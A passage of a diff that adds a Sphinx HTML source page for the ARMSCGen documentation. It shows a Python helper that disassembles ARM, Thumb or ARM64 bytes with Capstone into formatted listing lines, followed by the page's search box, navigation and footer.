+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">&#39;ARM64&#39;</span><span class="p">:</span>
+        <span class="n">xarch</span> <span class="o">=</span> <span class="n">CS_ARCH_ARM64</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">SYSERR</span><span class="p">(</span><span class="s">&quot;Not implemented yet&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;&quot;</span>
+
+    <span class="k">if</span> <span class="n">mode</span> <span class="o">==</span> <span class="s">&#39;THUMB&#39;</span><span class="p">:</span>
+        <span class="n">xmode</span> <span class="o">=</span> <span class="n">CS_MODE_THUMB</span>
+    <span class="k">else</span><span class="p">:</span>  
+        <span class="n">xmode</span> <span class="o">=</span> <span class="n">CS_MODE_ARM</span>
+
+    <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span><span class="p">(</span><span class="n">xarch</span><span class="p">,</span> <span class="n">xmode</span><span class="p">)</span>
+    <span class="n">md</span><span class="o">.</span><span class="n">detail</span> <span class="o">=</span> <span class="bp">True</span>
+
+    <span class="n">totalSize</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">dat</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">md</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x0000</span><span class="p">):</span>
+        <span class="c">#if i.id in (ARM_INS_BL, ARM_INS_CMP):</span>
+        <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%08x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">uu32</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">bytes</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">i</span><span class="o">.</span><span class="n">size</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%04x</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">uu16</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">bytes</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;-1&quot;</span>
+
+        <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;0x</span><span class="si">%08x</span><span class="s"> (</span><span class="si">%04d</span><span class="s">): </span><span class="si">%-8s</span><span class="s"> </span><span class="si">%-8s</span><span class="s"> </span><span class="si">%s</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">totalSize</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="o">.</span><span class="n">mnemonic</span><span class="p">,</span> <span class="n">i</span><span class="o">.</span><span class="n">op_str</span><span class="p">)</span>
+        <span class="n">totalSize</span> <span class="o">+=</span> <span class="n">i</span><span class="o">.</span><span class="n">size</span>    
+
+    <span class="k">return</span> <span class="n">dat</span></div>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar">
+        <div class="sphinxsidebarwrapper">
+<div id="searchbox" style="display: none">
+  <h3>Quick search</h3>
+    <form class="search" action="../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    <p class="searchtip" style="font-size: 90%">
+    Enter search terms or a module, class or function name.
+    </p>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../index.html">ARMSCGen $0.0.12 documentation</a> &raquo;</li>
+          <li><a href="index.html" >Module code</a> &raquo;</li> 
+      </ul>
+    </div>
+    <div class="footer">
+        &copy; Copyright 2014, alex.park.
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.1.3.
+    </div>
+  </body>
+</html>
